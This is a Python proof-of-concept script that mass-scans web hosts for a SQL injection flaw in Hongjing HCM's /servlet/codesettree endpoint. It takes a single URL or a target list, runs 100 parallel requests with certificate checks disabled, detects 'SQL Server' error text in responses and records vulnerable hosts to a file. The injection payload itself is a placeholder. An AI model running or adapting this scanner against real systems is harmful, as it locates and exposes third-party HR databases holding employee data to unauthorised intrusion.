import argparse,requests,sys,re
from multiprocessing import Pool

from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
def banner():
    banner="""
    
    
    """
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description="宏景HCM SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):

    payload = '/servlet/codesettree?categories=[加密后的恶意sql]&codesetid=1&flag=c&parentid=-1&status=1'
    headers={
        "User-Agent":"Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:109.0)Gecko/20100101Firefox/113.0",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding":"gzip,deflate",
        "Connection":"close",
        "Upgrade-Insecure-Requests":"1",

    }
    try:
        res1 = requests.get(url=target+payload,verify=False,headers=headers)
        content = res1.text
        if 'SQL Server' in content:
            print(f"[+]{target}存在漏洞")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
        elif res1.status_code != 200:
            print(f"[+]该{target}可能存在问题请手动测试")
        else:
            print(f"[-]{target}不存在漏洞")

    except Exception as e:

        print(e)
if __name__ == '__main__':
    main()
